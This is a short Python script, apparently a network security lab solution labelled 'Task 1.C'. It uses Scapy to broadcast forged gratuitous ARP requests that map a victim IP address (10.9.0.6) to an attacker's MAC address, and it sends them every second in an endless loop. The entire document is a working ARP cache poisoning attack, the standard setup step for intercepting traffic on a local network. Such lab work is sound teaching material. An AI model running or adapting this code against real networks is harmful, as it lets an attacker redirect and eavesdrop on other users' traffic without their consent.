## Task 1.C (Using ARP gratious message)

from time import sleep
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import ARP


ether = Ether()
arp = ARP()


MAC_Attacker = '02:42:0a:09:00:69'
MAC_A = '02:42:0a:09:00:05'
IP_A = '10.9.0.5'
IP_B = '10.9.0.6'


ether.src = MAC_Attacker
ether.dst = 'ff:ff:ff:ff:ff:ff'


arp.op = 1 # ARP REQUEST


arp.hwsrc = MAC_Attacker
arp.hwdst = 'ff:ff:ff:ff:ff:ff'
arp.psrc = IP_B
arp.pdst = IP_B
arp.hlen = 6
arp.plen = 4


pkt = ether / arp


while (True):
    sendp(pkt)
    sleep(1)